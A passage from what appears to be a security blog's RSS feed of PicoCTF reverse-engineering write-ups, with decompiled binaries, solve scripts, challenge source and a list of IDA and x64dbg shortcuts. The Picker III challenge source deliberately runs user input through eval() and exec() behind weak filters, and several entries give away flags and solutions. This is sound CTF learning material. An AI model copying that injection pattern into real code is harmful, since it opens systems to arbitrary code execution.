byte_20A0[BYTE8(v113) ^ BYTE8(v108)]; __asm { vpextrb rax, xmm4, 0Ch } v93 = byte_20A0[(BYTE12(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 1 } v25 = byte_20A0[(BYTE1(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 5 } v85 = byte_20A0[(BYTE5(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 9 } v84 = byte_20A0[(BYTE9(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 0Dh } v92 = byte_20A0[(BYTE13(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 2 } LOBYTE(v30) = byte_20A0[(BYTE2(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 6 } v32 = byte_20A0[(BYTE6(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 0Ah } v91 = byte_20A0[(BYTE10(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 0Eh } v96 = v32; v88 = v25; v90 = byte_20A0[(BYTE14(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 3 } v36 = byte_20A0[(BYTE3(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 7 } v95 = v36; v38 = byte_20A0[(BYTE7(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 0Bh } v40 = byte_20A0[(BYTE11(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 0Fh } v89 = byte_20A0[(HIBYTE(v108) ^ _RAX)]; do { v42 = v91 ^ v89 ^ v87 ^ v85; v99 = v87 ^ v89; v43 = v90 ^ v95 ^ v86 ^ v84; v97 = v30 ^ v38 ^ v94 ^ v92; v44 = v40 ^ v96 ^ v93 ^ v88; v45 = ((2 * (v86 ^ v95)) ^ (27 * ((v86 ^ v95) >> 7)) ^ v95 ^ v43 ^ v20[7]); v46 = v20[10] ^ v97 ^ v30 ^ (27 * ((v30 ^ v38) >> 7)) ^ (2 * (v30 ^ v38)); v47 = v20[11] ^ v97 ^ v38 ^ (2 * (v38 ^ v94)) ^ (27 * ((v38 ^ v94) >> 7)); v48 = v88 ^ v44 ^ v20[13] ^ (2 * (v88 ^ v96)) ^ (27 * ((v88 ^ v96) >> 7)); v49 = v96 ^ v44 ^ v20[14] ^ (27 * ((v40 ^ v96) >> 7)) ^ (2 * (v40 ^ v96)); v50 = v44 ^ v20[15] ^ v40 ^ (2 * (v40 ^ v93)) ^ (27 * ((v40 ^ v93) >> 7)); LOBYTE(v87) = byte_20A0[((2 * (v87 ^ v85)) ^ (27 * ((v87 ^ v85) >> 7)) ^ v42 ^ *v20 ^ v87)]; LOBYTE(v86) = byte_20A0[((2 * (v86 ^ v84)) ^ (27 * ((v86 ^ v84) >> 7)) ^ v86 ^ v43 ^ v20[4])]; v94 = byte_20A0[((2 * (v94 ^ v92)) ^ (27 * ((v94 ^ v92) >> 7)) ^ v94 ^ v97 ^ v20[8])]; v93 = byte_20A0[((27 * ((v93 ^ v88) >> 7)) ^ (2 * (v93 ^ v88)) ^ v93 ^ v20[12] ^ v44)]; v88 = byte_20A0[((2 * (v85 ^ v91)) ^ (27 * ((v85 ^ v91) >> 7)) ^ v85 ^ v42 ^ v20[1])]; v85 = byte_20A0[((27 * ((v84 ^ v90) >> 7)) ^ (2 * (v84 ^ v90)) ^ v84 ^ v43 ^ v20[5])]; v84 = byte_20A0[((27 * ((v30 ^ v92) >> 7)) ^ (2 * (v30 ^ v92)) ^ v20[9] ^ v97 ^ v92)]; v92 = byte_20A0[v48]; v51 = v91 ^ v42 ^ v20[2]; v20 += 16; v30 = byte_20A0[((2 * (v91 ^ v89)) ^ (27 * ((v91 ^ v89) >> 7)) ^ v51)]; v96 = byte_20A0[((27 * ((v90 ^ v95) >> 7)) ^ (2 * (v90 ^ v95)) ^ v43 ^ *(v20 - 10) ^ v90)]; v91 = byte_20A0[v46]; v90 = byte_20A0[v49]; v40 = byte_20A0[v47]; v38 = byte_20A0[v45]; v95 = byte_20A0[((27 * (v99 >> 7)) ^ (2 * v99) ^ v89 ^ v42 ^ *(v20 - 13))]; v89 = byte_20A0[v50]; } while ( v112 != v20 ); LOBYTE(v30) = v105 ^ v30; LOBYTE(v87) = v100 ^ v87; _R15D = v30; __asm { vmovd xmm5, r15d } v54 = v86; LOBYTE(v86) = v103 ^ v90; _R9D = (v101 ^ v91); _R10D = (v102 ^ v54); _EDX = (v107 ^ v96); _R13D = (v104 ^ v94); __asm { vmovd xmm4, edx vmovd xmm7, r9d vpinsrb xmm5, xmm5, ebx, 1 vmovd xmm3, r10d } v63 = 15LL; _ESI = (v106 ^ v93); __asm { vmovd xmm1, r13d vmovd xmm0, [rsp+208h+var_1F8] vmovd xmm6, [rsp+208h+var_1FC] vpinsrb xmm7, xmm7, [rsp+208h+var_1FD], 1 vpinsrb xmm0, xmm0, eax, 1 vpinsrb xmm1, xmm1, r11d, 1 vpunpcklwd xmm0, xmm0, xmm7 } v72 = HIBYTE(v113); __asm { vpinsrb xmm3, xmm3, [rsp+208h+var_1FE], 1 vpinsrb xmm6, xmm6, [rsp+208h+var_1F4], 1 vpunpcklwd xmm1, xmm1, xmm5 vpunpcklwd xmm3, xmm3, xmm6 vmovd xmm2, esi vpunpckldq xmm0, xmm0, xmm3 vpinsrb xmm2, xmm2, r8d, 1 vpinsrb xmm4, xmm4, ecx, 1 vpunpcklwd xmm2, xmm2, xmm4 vpunpckldq xmm1, xmm1, xmm2 vpunpcklqdq xmm0, xmm0, xmm1 vmovdqa [rsp+208h+var_98], xmm0 } if ( HIBYTE(v113) != 0xFF ) goto LABEL_14; v72 = BYTE14(v113); HIBYTE(v113) = 0; v63 = 14LL; if ( BYTE14(v113) != 0xFF ) goto LABEL_14; v72 = BYTE13(v113); BYTE14(v113) = 0; v63 = 13LL; if ( BYTE13(v113) != 0xFF ) goto LABEL_14; v72 = BYTE12(v113); BYTE13(v113) = 0; v63 = 12LL; if ( BYTE12(v113) != 0xFF ) goto LABEL_14; v72 = BYTE11(v113); BYTE12(v113) = 0; v63 = 11LL; if ( BYTE11(v113) != 0xFF ) goto LABEL_14; v72 = BYTE10(v113); BYTE11(v113) = 0; v63 = 10LL; if ( BYTE10(v113) != 0xFF ) goto LABEL_14; v72 = BYTE9(v113); BYTE10(v113) = 0; v63 = 9LL; if ( BYTE9(v113) != 0xFF ) goto LABEL_14; v72 = BYTE8(v113); BYTE9(v113) = 0; v63 = 8LL; if ( BYTE8(v113) != 0xFF ) goto LABEL_14; v72 = BYTE7(v113); BYTE8(v113) = 0; v63 = 7LL; if ( BYTE7(v113) != 0xFF ) goto LABEL_14; v72 = BYTE6(v113); BYTE7(v113) = 0; v63 = 6LL; if ( BYTE6(v113) != 0xFF ) goto LABEL_14; v72 = BYTE5(v113); BYTE6(v113) = 0; v63 = 5LL; if ( BYTE5(v113) != 0xFF ) goto LABEL_14; v72 = BYTE4(v113); BYTE5(v113) = 0; v63 = 4LL; if ( BYTE4(v113) != 0xFF ) goto LABEL_14; v72 = BYTE3(v113); BYTE4(v113) = 0; v63 = 3LL; if ( BYTE3(v113) != 0xFF ) goto LABEL_14; v72 = BYTE2(v113); BYTE3(v113) = 0; v63 = 2LL; if ( BYTE2(v113) != 0xFF ) goto LABEL_14; v72 = BYTE1(v113); BYTE2(v113) = 0; v63 = 1LL; if ( BYTE1(v113) == 0xFF &amp;&amp; (v72 = v113, BYTE1(v113) = 0, v63 = 0LL, v113 == 0xFF) ) { LOBYTE(v113) = 0; v16 = 0; } else { LABEL_14: *(&amp;v113 + v63) = v72 + 1; v16 = 0; } } v17 = v16++; *v98++ ^= *(&amp;v115[-1] + v17); } while ( &amp;v116 != v98 ); v18 = memcmp(v115, ptr, 0x40uLL); if ( v18 ) { v18 = 1; puts("Nope, come back later"); } else { puts("Yep, that's it!"); } return v18; } :::</description></item><item><title>PicoCTF - OTP Implementation</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---otp-implementation/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---otp-implementation/index.html</guid><description>PicoCTF - OTP Implementation Source code :::spoiler IDA Main Function
int __cdecl main(int argc, const char **argv, const char **envp) { char v4; // al char v5; // dl unsigned int v6; // eax int i; // [rsp+18h] [rbp-E8h] int j; // [rsp+1Ch] [rbp-E4h] char input_key[112]; // [rsp+20h] [rbp-E0h] BYREF char tmp_key[104]; // [rsp+90h] [rbp-70h] BYREF unsigned __int64 v11; // [rsp+F8h] [rbp-8h] v11 = __readfsqword(0x28u); if ( argc > 1 ) { strncpy(input_key, argv[1], 0x64uLL); input_key[100] = 0; for ( i = 0; valid_char(input_key[i]); ++i )// 確認字元是否在[0-9|a-f]之間 { if ( i ) { v4 = jumble(input_key[i]); v5 = tmp_key[i - 1] + v4; v6 = ((tmp_key[i - 1] + v4) >> 31) >> 28; tmp_key[i] = ((v6 + v5) &amp; 0xF) - v6; } else { tmp_key[0] = jumble(input_key[0]) % 16; } } for ( j = 0; j &lt; i; ++j ) tmp_key[j] += 0x61; if ( i == 100 &amp;&amp; !strncmp( tmp_key, "bajbgfapbcclgoejgpakmdilalpomfdlkngkhaljlcpkjgndlgmpdgmnmepfikanepopbapfkdgleilhkfgilgabldofbcaedgfe", 100uLL) ) { puts("You got the key, congrats! Now xor it with the flag!"); return 0; } else { puts("Invalid key!"); return 1; } } else { printf("USAGE: %s [KEY]\n", *argv); return 1; } } :::</description></item><item><title>PicoCTF - Picker III</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---picker-iii/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---picker-iii/index.html</guid><description>PicoCTF - Picker III Source code :::spoiler Source Code
import re USER_ALIVE = True FUNC_TABLE_SIZE = 4 FUNC_TABLE_ENTRY_SIZE = 32 CORRUPT_MESSAGE = 'Table corrupted. Try entering \'reset\' to fix it' func_table = '' def reset_table(): global func_table # This table is formatted for easier viewing, but it is really one line func_table = \ '''\ print_table \ read_variable \ write_variable \ getRandomNumber \ ''' def check_table(): global func_table if( len(func_table) != FUNC_TABLE_ENTRY_SIZE * FUNC_TABLE_SIZE): return False return True def get_func(n): global func_table # Check table for viability if( not check_table() ): print(CORRUPT_MESSAGE) return # Get function name from table func_name = '' func_name_offset = n * FUNC_TABLE_ENTRY_SIZE for i in range(func_name_offset, func_name_offset+FUNC_TABLE_ENTRY_SIZE): if( func_table[i] == ' '): func_name = func_table[func_name_offset:i] break if( func_name == '' ): func_name = func_table[func_name_offset:func_name_offset+FUNC_TABLE_ENTRY_SIZE] return func_name def print_table(): # Check table for viability if( not check_table() ): print(CORRUPT_MESSAGE) return for i in range(0, FUNC_TABLE_SIZE): j = i + 1 print(str(j)+': ' + get_func(i)) def filter_var_name(var_name): r = re.search('^[a-zA-Z_][a-zA-Z_0-9]*$', var_name) if r: return True else: return False def read_variable(): var_name = input('Please enter variable name to read: ') if( filter_var_name(var_name) ): eval('print('+var_name+')') else: print('Illegal variable name') def filter_value(value): if ';' in value or '(' in value or ')' in value: return False else: return True def write_variable(): var_name = input('Please enter variable name to write: ') if( filter_var_name(var_name) ): value = input('Please enter new value of variable: ') if( filter_value(value) ): exec('global '+var_name+'; '+var_name+' = '+value) else: print('Illegal value') else: print('Illegal variable name') def call_func(n): """ Calls the nth function in the function table. Arguments: n: The function to call. The first function is 0. """ # Check table for viability if( not check_table() ): print(CORRUPT_MESSAGE) return # Check n if( n &lt; 0 ): print('n cannot be less than 0. Aborting...') return elif( n >= FUNC_TABLE_SIZE ): print('n cannot be greater than or equal to the function table size of '+FUNC_TABLE_SIZE) return # Get function name from table func_name = get_func(n) # Run the function eval(func_name+'()') def dummy_func1(): print('in dummy_func1') def dummy_func2(): print('in dummy_func2') def dummy_func3(): print('in dummy_func3') def dummy_func4(): print('in dummy_func4') def getRandomNumber(): print(4) # Chosen by fair die roll. # Guaranteed to be random. # (See XKCD) def win(): # This line will not work locally unless you create your own 'flag.txt' in # the same directory as this script flag = open('flag.txt', 'r').read() #flag = flag[:-1] flag = flag.strip() str_flag = '' for c in flag: str_flag += str(hex(ord(c))) + ' ' print(str_flag) def help_text(): print( ''' This program fixes vulnerabilities in its predecessor by limiting what functions can be called to a table of predefined functions. This still puts the user in charge, but prevents them from calling undesirable subroutines. * Enter 'quit' to quit the program. * Enter 'help' for this text. * Enter 'reset' to reset the table. * Enter '1' to execute the first function in the table. * Enter '2' to execute the second function in the table. * Enter '3' to execute the third function in the table. * Enter '4' to execute the fourth function in the table. Here's the current table: ''' ) print_table() reset_table() while(USER_ALIVE): choice = input('==> ') if( choice == 'quit' or choice == 'exit' or choice == 'q' ): USER_ALIVE = False elif( choice == 'help' or choice == '?' ): help_text() elif( choice == 'reset' ): reset_table() elif( choice == '1' ): call_func(0) elif( choice == '2' ): call_func(1) elif( choice == '3' ): call_func(2) elif( choice == '4' ): call_func(3) else: print('Did not understand "'+choice+'" Have you tried "help"?') :::</description></item><item><title>PicoCTF - Powershelly</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---powershelly/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---powershelly/index.html</guid><description>PicoCTF - Powershelly Background Powershell 命令提示字元比較 What is ‘@{}’ meaning in PowerShell What does @() mean in Powershell? [Python] 學習使用集合 (Set)
Source code :::spoiler Source Code
$input = ".\input.txt" $out = Get-Content -Path $input $enc = [System.IO.File]::ReadAllBytes("$input") $encoding = [system.Text.Encoding]::UTF8 $total = 264 $t = ($total + 1) * 5 #1325 $numLength = ($total * 30 ) + $t # 9245 if ($out.Length -gt 5 -or $enc.count -ne $numLength) { Write-Output "Wrong format 5" Exit } else { for($i=0; $i -lt $enc.count ; $i++) { if (($enc[$i] -ne 49) -and ($enc[$i] -ne 48) -and ($enc[$i] -ne 10) -and ($enc[$i] -ne 13) -and ($enc[$i] -ne 32)) { Write-Output "Wrong format 1/0/" Exit } } } $blocks = @{} for ($i=0; $i -lt $out.Length ; $i++) { $r = $out[$i].Split(" ") if ($i -gt 0) { for ($j=0; $j -lt $r.Length ; $j++) { if ($r[$j].Length -ne 6) { Write-Output "Wrong Format 6" $r[$j].Length Exit } $blocks[$j] += $r[$j] } } else { for ($j=0; $j -lt $r.Length ; $j++) { if ($r[$j].Length -ne 6) { Write-Output "Wrong Format 6" $r[$j].Length Exit } $blocks[$j] = @() $blocks[$j] += $r[$j] } } } function Exit { exit } function Random-Gen { $list1 = @() for ($i=1; $i -lt ($blocks.count + 1); $i++) { $y = ((($i * 327) % 681 ) + 344) % 313 $list1 += $y } return $list1 } function Scramble { param ( $block, $seed ) $raw = [system.String]::Join("", $block) $bm = "10 " * $raw.Length $bm = $bm.Split(" ") for ($i=0; $i -lt $raw.Length ; $i++) { $y = ($i * $seed) % $raw.Length $n = $bm[$y] while ($n -ne "10") { $y = ($y + 1) % $raw.Length $n = $bm[$y] } if ($raw[$i] -eq "1" ) { $n = "11" } else { $n = "00" } $bm[$y] = $n } $raw2 = [system.String]::Join("", $bm) $b = [convert]::ToInt64($raw2,2) return $b } $result = 0 $seeds = @() for ($i=1; $i -lt ($blocks.count +1); $i++) { $seeds += ($i * 127) % 500 } $randoms = Random-Gen $output_file = @() for ($i=0; $i -lt $blocks.count ; $i++) { $fun = Scramble -block $blocks[$i] -seed $seeds[$i] if($i -eq 263) { Write-Output $seeds[$i] Write-Output $randoms[$i] Write-Output $fun } $result = $fun -bxor $result -bxor $randoms[$i] $output_file += $result } Add-Content -Path output_test.txt -Value $output_file :::</description></item><item><title>PicoCTF - Transformation</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---transformation/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---transformation/index.html</guid><description>PicoCTF - Transformation tags: PicoCTF CTF Reverse Challenge: Transformation
Source code enc file content: 灩捯䍔䙻ㄶ形楴獟楮獴㌴摟潦弸彥㜰㍢㐸㙽 Transformation Code
''.join([chr((ord(flag[i]) &lt;&lt; 8) + ord(flag[i + 1])) for i in range(0, len(flag), 2)]) Seems it shift the first character with 8 bits and concatenate the 2nd character then go through len(flag)
Exploit My perspective is just recover the strings :::spoiler
flag = '灩捯䍔䙻ㄶ形楴獟楮獴㌴摟潦弸彥㜰㍢㐸㙽' enc = '' def decimalToBinary(n): return bin(n).replace("0b", "") def binToHexa(n): bnum = int(n) temp = 0 mul = 1 count = 1 hexaDeciNum = ['0'] * 100 i = 0 while bnum != 0: rem = bnum % 10 temp = temp + (rem*mul) if count % 4 == 0: if temp &lt; 10: hexaDeciNum[i] = chr(temp+48) else: hexaDeciNum[i] = chr(temp+55) mul = 1 temp = 0 count = 1 i = i+1 else: mul = mul*2 count = count+1 bnum = int(bnum/10) if count != 1: hexaDeciNum[i] = chr(temp+48) if count == 1: i = i-1 hex_string = '' while i >= 0: hex_string += hexaDeciNum[i] i = i-1 return hex_string for i in range(0, len(flag)): plaintext1 = decimalToBinary(ord(flag[i])) while(len(plaintext1) != 16): plaintext1 = '0' + plaintext1 plaintext2 = plaintext1[-8:] plaintext1 = plaintext1[0:8] enc += binToHexa(plaintext1) enc += binToHexa(plaintext2) print(bytes.fromhex(enc).decode('utf-8')) :::</description></item><item><title>PicoCTF - Wizardlike</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---wizardlike/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---wizardlike/index.html</guid><description>PicoCTF - Wizardlike Recon 這一題蠻有趣的，如果只是單純執行程式碼，會發現是一個迷宮的遊戲，不過走越多會發現兩個現象
遊戲本身根本無法破關 有一些"道路"回隨著角色本身的移動慢慢浮現出來 我也不知道是哪來的想法直覺想要看他的地圖，因為看IDA翻出來的code，貌似有十個關卡，而如果把地圖翻出來會發現每一個關卡總共會有10000個字元，然後每一列都是100個字元呈現，然後就發現他其實是用地圖的方式呈現他的flag，則我們可以先把10個關卡的所有字元另存一個檔案(純手工)，再寫一點點script就可以把flag還原
Exploit - 通靈 f = open('./cipher.txt', 'r').read() pt = open('./flag.txt', 'w') flag = "\n".join([f[100 * i : 100 * i + 100] for i in range(len(f) // 100)]) pt.write(flag) :::spoiler flag
######### #.......# ......#................................... #.......# ....................####.#####.#####..###. #........ .####.#..###..###..#.......#...#......#... #.......# .# #.#.#....# #.#.......#...###...#.... #.......# .####.#.#....# #.#.......#...#......#... #.......# .#....#..###..###...####...#...#......###. #.......# .#........................................ #.......# .......................................... #.......# #.......# #.......# #.......# #.......# #......># ######### #####. ............................................................. #.&lt;.#. ...............#..#.............##.......#..#........#....... #...#. .#..#.###......#..#.......#...#..#.####..#..#.###....#....... #...#. .#..#.#........####.......#.#.#..#...#...####.#...####....... #...#. .####.#...####....#.#####..#.#..###.####....#.#...####.#####. . ............................................................. . ............................................................. . ............................................................. #.... #...# #...# #...# #...# #...# #.>.# ##### ################# ....... #&lt;..............#. ..###.. #...............#.. .#...#. #..............#......###.. #...#.......#...#.. .#...#. #..###.....###..#. ..###.. #...#...#...#...# ....... #......#>#......# ....... #...............# #...#.......#...# #..###.....###..# #...#.......#...# #...............# #...............# #...............# ################# ... .. ....... .&lt;. ####. .#####. ... ...#.. .#..... ... ...#....###... ..>#.. .#..... ####. .#..... .. ....... ....... ######################## #&lt;.............#.......# #..............#.#...#.# #..............#.#...#.# #..............#.#####.# #..............#.....#.# #..............#.....#.# #..............#.......# #..............#.......# ######################## ....... .&lt;..... ....... ....... ....... ....... ....... ....... ....... ....... ....... .....>. ....... ####### ....... .####.. .#...#. .####.. .#...#. .####.. ....... ....... ... .&lt;......... ........... ... .. .. .. .. .. .. .. .............. ..##########.. .# #. .# ....... #. .# ..###.. #. .# .#...#. #. .# .#...#. #. .# .#...#. #. .# ..###.. #. .# ....... #. .# ....... #. .# #. ..##########.. .............> ######################### #&lt;#......#.#.......###..# #.#.###..#.#.......##..## #.#.#.#..#.#.......#..### #.#.#.#..#.#.......#...## #...#....#..#......#....# #.######.##..###.###....# #.#.....................# #.###.#################.# #.......................# #########.###.#########.# #.......#.#.#.#.........# #.#...#.#.#...#.######### #.#...#.#.#.#.#.........# #.#####.#.#.#.#########.# #.....#.#.#.#.#.........# #.....#.#.#.#.#.######### #.......#.#.#.#.........# #.......#.#.#.#########.# #########.#.#.#...#...#.# #...........#.#.#.#.#.#.# #########...#.#.#.#.#.#.# #.......#...#.#.#.#.#.#.# ####.####...#.#.#.#.#.#.# ##..........#.#.#.#.#.#.# #.#..####...#.#.#.#.#.#.# #..#....#####.#.#.#.#.#.# #...#...#...#.#.#...#...# #....#........#.######### #...........#.#........># ########################. ... ....... .&lt;. ..###.. ... .#...#. ... .#####. .#...#. .#...#. ....... ....... #####################################################################################..............# #####################################################################################.#####.###....# #####################################################################################.#.......#....# #####################################################################################.###......#...# #####################################################################################.#.......#....# #####################################################################################.#####.###....# #####################################################################################..............# #####################################################################################..............# :::</description></item><item><title>Reverse Overview</title><link>https://bernie6401.github.io/tools/ctf/reverse-overview/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/ctf/reverse-overview/index.html</guid><description>Reverse Overview Tools Type App .NET x86/x64 Packer Python C General Description MobSF: Must run in python 3.8ApkTool: Just follow the step in install guide To decompile C#(.NET) 指令：$ upx -d {filename} 一個可以把組語轉換成c pseudo code的線上工具 一個線上的decompiler，結合多種工具，只要上傳檔案(小於2MB)就可以呈現多種decompiler tools的結果 Link MobSFApkTools dnSpy x86模擬器x86/x64 assembler/disassembler UPX Packer Pyc disassemble Compiler Explorer Decompiler Explorer IDA 常用快捷鍵 IDA Interface 型別 char(1 byte) WORD(2 bytes) DWORD(4 bytes) PDWORD(pointer of DWORD = DWORD *) 若是DWORD *name，代表name這個變數是一個pointer而且指向的地方是一個DWORD Space: 在 Text View / Graph View 切換 Tab: 在視窗之間切換 ;/Insert: 註解 x: 秀出 Xrefs n: 改名 y: 改型別 h: 改表示方式 (dec / hex) u: 取消定義 a: 當成字串 c: 當成code p: 當成function t: set sizeof(XXX)；如果已經確定目前的constant就是某個變數的length，那可以直接按t讓他變成sizeof(那個變數) 舉例：如果已經確定目前的0x238就是PROCESSENTRY32W的size，就可以直接這樣用，會變得比較清楚 :::spoiler 結果 ::: Shift+F1: show出Local Type視窗 :::spoiler Local Types Screenshot ::: Shift+F12: 開啟Strings視窗 :::spoiler Strings Screenshot ::: 對某一個數值按m: ENUM這個功能就是在替換一些常見的windows API參數，讓原本的純數字可以用文字表示，這樣比較好懂API的操作，逆向會更順暢(補充說明：IDA有收錄很多MSDN上的一些API，他每一個參數表示的文字，例如這一篇底下有顯示很多Constant/value的對應，而正常情況下IDA會顯示的是value，如果要把它換成Constant文字的表達式就可以用到ENUM這個功能)，又例如: 目前已經知道CreateToolhelp32Snapshot(2, 0);中的2的意義是TH32CS_SNAPPROCESS(可以參考MSDN)，此時就可以直接按m之後再選擇TH32CS_SNAPPROCESS :::spoiler ::: \: 不顯示/顯示資料型別 Alt+M/Ctrl+M: 前者是註冊書籤，後者是察看並選擇標籤，可以快速跑到標示的地址 Ctrl+E: 如果是分析DLL file，可能會有很多不同的entry point，利用這個shortcut可以顯示目前有幾個entry point，很方便 :::spoiler ::: 如何把bytes變成字串: 可以直接Alt+A :::spoiler 可以先把bytes的型別定義好(單獨的bytes變成array)，變成array有兩種方法，第一種是直接用Y定義他的型別成int dword_2008[32]，前面的int就看每一個字元是來決定，後面[32]就代表有多少字元變成array；第二種方法就是直接按d改變一個字元的型態變成int，然後在edit/Array的地方可以叫出Convert to array的視窗(如果前面沒有先用d改變型態的話，他會以為所有字元都是一個byte，然後總共有128個字元這樣換算，但其實我們是總共32個字元，每一個字元是4個bytes，也就是int，這一點要特別注意) 接著就是在Option/String literals視窗中設定用哪一個型態表示字串，這邊因為每一個字元都是4 bytes，也就是32 bits，所以選擇C-style ::: :::spoiler 完整流程 .rodata:0000000000002008 unk_2008 db 46h ; F ; DATA XREF: main+8↑o .rodata:0000000000002009 db 0 .rodata:000000000000200A db 0 .rodata:000000000000200B db 0 .rodata:000000000000200C db 4Ch ; L .rodata:000000000000200D db 0 .rodata:000000000000200E db 0 .rodata:000000000000200F db 0 .rodata:0000000000002010 db 41h ; A .rodata:0000000000002011 db 0 .rodata:0000000000002012 db 0 .rodata:0000000000002013 db 0 .rodata:0000000000002014 db 47h ; G .rodata:0000000000002015 db 0 .rodata:0000000000002016 db 0 .rodata:0000000000002017 db 0 .rodata:0000000000002018 db 7Bh ; { .rodata:0000000000002019 db 0 .rodata:000000000000201A db 0 .rodata:000000000000201B db 0 .rodata:000000000000201C db 68h ; h .rodata:000000000000201D db 0 .rodata:000000000000201E db 0 .rodata:000000000000201F db 0 .rodata:0000000000002020 db 33h ; 3 .rodata:0000000000002021 db 0 .rodata:0000000000002022 db 0 .rodata:0000000000002023 db 0 .rodata:0000000000002024 db 31h ; 1 .rodata:0000000000002025 db 0 .rodata:0000000000002026 db 0 .rodata:0000000000002027 db 0 .rodata:0000000000002028 db 31h ; 1 .rodata:0000000000002029 db 0 .rodata:000000000000202A db 0 .rodata:000000000000202B db 0 .rodata:000000000000202C db 4Fh ; O .rodata:000000000000202D db 0 .rodata:000000000000202E db 0 .rodata:000000000000202F db 0 .rodata:0000000000002030 db 5Fh ; _ .rodata:0000000000002031 db 0 .rodata:0000000000002032 db 0 .rodata:0000000000002033 db 0 .rodata:0000000000002034 db 72h ; r .rodata:0000000000002035 db 0 .rodata:0000000000002036 db 0 .rodata:0000000000002037 db 0 .rodata:0000000000002038 db 65h ; e .rodata:0000000000002039 db 0 .rodata:000000000000203A db 0 .rodata:000000000000203B db 0 .rodata:000000000000203C db 76h ; v .rodata:000000000000203D db 0 .rodata:000000000000203E db 0 .rodata:000000000000203F db 0 .rodata:0000000000002040 db 65h ; e .rodata:0000000000002041 db 0 .rodata:0000000000002042 db 0 .rodata:0000000000002043 db 0 .rodata:0000000000002044 db 72h ; r .rodata:0000000000002045 db 0 .rodata:0000000000002046 db 0 .rodata:0000000000002047 db 0 .rodata:0000000000002048 db 73h ; s .rodata:0000000000002049 db 0 .rodata:000000000000204A db 0 .rodata:000000000000204B db 0 .rodata:000000000000204C db 31h ; 1 .rodata:000000000000204D db 0 .rodata:000000000000204E db 0 .rodata:000000000000204F db 0 .rodata:0000000000002050 db 6Eh ; n .rodata:0000000000002051 db 0 .rodata:0000000000002052 db 0 .rodata:0000000000002053 db 0 .rodata:0000000000002054 db 67h ; g .rodata:0000000000002055 db 0 .rodata:0000000000002056 db 0 .rodata:0000000000002057 db 0 .rodata:0000000000002058 db 5Fh ; _ .rodata:0000000000002059 db 0 .rodata:000000000000205A db 0 .rodata:000000000000205B db 0 .rodata:000000000000205C db 33h ; 3 .rodata:000000000000205D db 0 .rodata:000000000000205E db 0 .rodata:000000000000205F db 0 .rodata:0000000000002060 db 6Eh ; n .rodata:0000000000002061 db 0 .rodata:0000000000002062 db 0 .rodata:0000000000002063 db 0 .rodata:0000000000002064 db 67h ; g .rodata:0000000000002065 db 0 .rodata:0000000000002066 db 0 .rodata:0000000000002067 db 0 .rodata:0000000000002068 db 69h ; i .rodata:0000000000002069 db 0 .rodata:000000000000206A db 0 .rodata:000000000000206B db 0 .rodata:000000000000206C db 6Eh ; n .rodata:000000000000206D db 0 .rodata:000000000000206E db 0 .rodata:000000000000206F db 0 .rodata:0000000000002070 db 65h ; e .rodata:0000000000002071 db 0 .rodata:0000000000002072 db 0 .rodata:0000000000002073 db 0 .rodata:0000000000002074 db 65h ; e .rodata:0000000000002075 db 0 .rodata:0000000000002076 db 0 .rodata:0000000000002077 db 0 .rodata:0000000000002078 db 72h ; r .rodata:0000000000002079 db 0 .rodata:000000000000207A db 0 .rodata:000000000000207B db 0 .rodata:000000000000207C db 35h ; 5 .rodata:000000000000207D db 0 .rodata:000000000000207E db 0 .rodata:000000000000207F db 0 .rodata:0000000000002080 db 7Dh ; } .rodata:0000000000002081 db 0 .rodata:0000000000002082 db 0 .rodata:0000000000002083 db 0 .rodata:0000000000002084 db 0 .rodata:0000000000002085 db 0 .rodata:0000000000002086 db 0 .rodata:0000000000002087 db 0 $\downarrow$ .rodata:0000000000002008 dword_2008 dd 46h, 4Ch, 41h, 47h, 7Bh, 68h, 33h, 2 dup(31h), 4Fh, 5Fh, 72h, 65h, 76h, 65h, 72h, 73h, 31h, 6Eh, 67h .rodata:0000000000002008 ; DATA XREF: main+8↑o .rodata:0000000000002008 dd 5Fh, 33h, 6Eh, 67h, 69h, 6Eh, 2 dup(65h), 72h, 35h, 7Dh, 0 $\downarrow$ .rodata:0000000000002008 text "UTF-32LE", 'FLAG{h311O_revers1ng_3ngineer5}',0 ::: 如何快速把bytes dump出來 :::spoiler 選擇要輸出的bytes 按Shift+E，跳出的視窗選擇想要的格式，再直接複製即可 ::: 如果函式沒有return東西的話，可以右鍵該函示，選擇Remove return value或是Shift+Del :::spoiler ::: 如果function中的宣告很多，可以右鍵選擇Collapse declarations :::spoiler ::: x64dbg 常用快捷鍵 F2: 設定中斷點 F9: 繼續執行 F8: 步過 F7: 步入 Ctrl+F9: 執行到 ret ==Ctrl+G==: goto ==Space==: 修改組譯 靜態分析 PEview PEViewer PE-bear 動態分析 OllyDbg x64dbg IDA Ghidra Windbg PEtool Process相關的操作與資訊 Procexp &amp; Process Hacker 好看版的工作管理員 Procmon 監控程序行為 Registry File system Network 